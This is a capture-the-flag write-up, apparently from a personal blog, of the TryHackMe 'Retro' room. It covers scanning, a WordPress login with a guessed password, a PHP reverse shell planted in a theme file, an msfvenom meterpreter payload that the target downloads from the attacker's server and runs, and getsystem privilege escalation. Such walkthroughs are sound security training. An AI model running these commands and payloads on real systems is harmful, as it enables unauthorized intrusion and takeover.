@@ -1,0 +1,200 @@
+
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Retro | tudor.mindra</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="Retro" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="THM - Retro" />
+<meta property="og:description" content="THM - Retro" />
+<link rel="canonical" href="https://tudm99.github.io/retro.html" />
+<meta property="og:url" content="https://tudm99.github.io/retro.html" />
+<meta property="og:site_name" content="tudor.mindra" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Retro" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"THM - Retro","headline":"Retro","url":"https://tudm99.github.io/retro.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link rel="preload" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700&display=swap" as="style" type="text/css" crossorigin>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#157878">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="stylesheet" href="/assets/css/style.css?v=9d81aa5ec0fd3d378905a6f5c775505f2ede6d9d">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <a id="skip-to-content" href="#content">Skip to the content.</a>
+
+    <header class="page-header" role="banner">
+      <h1 class="project-name">Retro</h1>
+      <h2 class="project-tagline">THM - Retro</h2>
+      
+      
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h2 id="enumeration">Enumeration</h2>
+<p>Nmap:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 20:18 EEST
+Nmap scan report for 10.10.190.35
+Host is up (0.067s latency).
+Not shown: 65533 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 115.00 seconds
+</code></pre></div></div>
+<p>Gobuster:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/retro
+/retro/wp-content
+/retro/wp-includes
+/retro/wp-login.php
+</code></pre></div></div>
+<p>From the gobuster results, we figure that the website is running on wordpress.
+The host OS is windows, so we may need to look into some powershell later on.</p>
+
+<p>Let’s take a look at the website. CTF creators like to hide things in plain sight.</p>
+
+<p>We click on “Wade” and we have all his posts and comments.</p>
+
+<p>Let’s read through some posts.</p>
+
+<p>Alright, found nothing, but there was a single comment.</p>
+
+<p><img src="https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/retro_01.png" alt="image" /></p>
+
+<p>Let’s try logging into wordpress with that word as a password, and I’ll try a few usernames like wade, admin, etc.</p>
+
+<p>And we’re in!</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>Now we’ll use the good ol’ theme editor to get a reverse shell on the system.</p>
+
+<p>I’ll use Twenty Seventeen, with a php shell from Ivan Sincek, but you can go ahead and experiment. Replace the 404.php content with your shell, and launch it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.190.35/retro/wp-content/themes/twentyseventeen/404.php
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvnp 9002
+Listening on 0.0.0.0 9002
+Connection received on 10.10.190.35 49854
+SOCKET: Shell has connected! PID: 1864
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\inetpub\wwwroot\retro\wp-content\themes\twentyseventeen&gt;
+
+</code></pre></div></div>
+<p>Great! We have a shell. Let’s look around for interesting files, and write permissions.</p>
+
+<p>First of all, I’ll pop into powershell since I find it easier to navigate with.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users&gt; cd Wade
+PS C:\Users\Wade&gt; ls
+ls : Access to the path 'C:\Users\Wade' is denied.
+At line:1 char:1
++ ls
++ ~~
+    + CategoryInfo          : PermissionDenied: (C:\Users\Wade:String) [Get-Ch 
+   ildItem], UnauthorizedAccessException
+    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell. 
+   Commands.GetChildItemCommand
+ 
+PS C:\Users\Wade&gt; 
+
+</code></pre></div></div>
+<p>I tried accessing the “Wade” folder, but my access is denied. Same story with the admin folder.</p>
+
+<p>This being a Windows machine, most likely we’ll have write access to the public folders. Let’s give it a go.</p>
+
+<p>First, I’ll generate an msfvenom payload for a reverse_tcp connection.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.18.116.220 LPORT=9003 -f exe -o reverse.exe
+msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.18.116.220; set lport 9003; exploit"
+</code></pre></div></div>
+<p>And now, with a python http server open, let’s try to download and execute the “reverse.exe” file</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\Public&gt; $url = "http://10.18.116.220:8000/reverse.exe"
+PS C:\Users\Public&gt; $outpath = "C:/Users/Public/reverse.exe"
+PS C:\Users\Public&gt; Invoke-WebRequest -Uri $url -OutFile $outpath
+PS C:\Users\Public&gt; ls
+
+
+    Directory: C:\Users\Public
+
+
+Mode                LastWriteTime         Length Name                          
+----                -------------         ------ ----                          
+d-r---        12/8/2019  10:49 PM                Documents                     
+d-r---        7/16/2016   6:23 AM                Downloads                     
+d-r---        7/16/2016   6:23 AM                Music                         
+d-r---        7/16/2016   6:23 AM                Pictures                      
+d-r---        7/16/2016   6:23 AM                Videos                        
+-a----        9/23/2023  10:42 AM           7168 reverse.exe                   
+
+
+PS C:\Users\Public&gt;
+
+</code></pre></div></div>
+
+<p>Good, we now have our payload on the machine. Let’s try running it.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\Public&gt; .\reverse.exe
+
+payload =&gt; windows/x64/meterpreter/reverse_tcp
+lhost =&gt; 10.18.116.220
+lport =&gt; 9003
+[*] Started reverse TCP handler on 10.18.116.220:9003 
+[*] Sending stage (200774 bytes) to 10.10.190.35
+[*] Meterpreter session 1 opened (10.18.116.220:9003 -&gt; 10.10.190.35:49874) at 2023-09-23 20:43:39 +0300
+
+meterpreter &gt; getuid
+Server username: IIS APPPOOL\retro
+meterpreter &gt; 
+
+</code></pre></div></div>
+<p>Nice, we have a meterpreter shell.</p>
+
+<h2 id="privilege-escalation">Privilege Escalation:</h2>
+
+<p>We’ll use the default meterpreter “getsystem” command.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; getsystem
+...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+</code></pre></div></div>
+<p>We now have system privileges. We can read both flags and submit them!</p>
+
+<p>Good hunting o7</p>
+
+<p><a href="https://tryhackme.com/room/retro">Try it out yourself!</a></p>
+
+<script src="https://platform.linkedin.com/in.js" type="text/javascript">lang: en_US</script>
+<script type="IN/Share" data-url="https://www.linkedin.com"></script>
+
+<p><a href="./">back</a></p>
+
+
+      <footer class="site-footer">
+        
+        <span class="site-footer-credits">This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.</span>
+      </footer>
+    </main>
+  </body>
+</html>
